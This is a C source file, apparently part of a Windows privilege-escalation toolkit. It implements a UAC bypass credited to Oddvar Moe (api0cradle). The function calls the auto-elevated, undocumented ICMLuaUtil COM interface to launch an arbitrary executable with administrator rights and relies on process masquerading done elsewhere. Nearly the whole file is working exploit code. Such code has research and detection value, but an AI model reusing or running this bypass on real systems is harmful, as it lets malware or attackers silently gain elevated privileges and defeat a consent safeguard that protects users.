/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2018
*
*  TITLE:       API0CRADLE.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  UAC bypass method from Oddvar Moe aka api0cradle.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
BOOL ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
)
{
    HRESULT          r = E_FAIL, hr_init;
    BOOL             bCond = FALSE, bApprove = FALSE;
    ICMLuaUtil      *CMLuaUtil = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Potential fix check.
        //
        if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
            if (bApprove == FALSE)
                if (ucmShowQuestion(UACFIX) != IDYES)
                    break;
        }

        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            &CMLuaUtil);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            r = E_OUTOFMEMORY;
            break;
        }

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, 
            lpszExecutable, 
            NULL, 
            NULL, 
            SEE_MASK_DEFAULT, 
            SW_SHOW);

    } while (bCond);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    return SUCCEEDED(r);
}
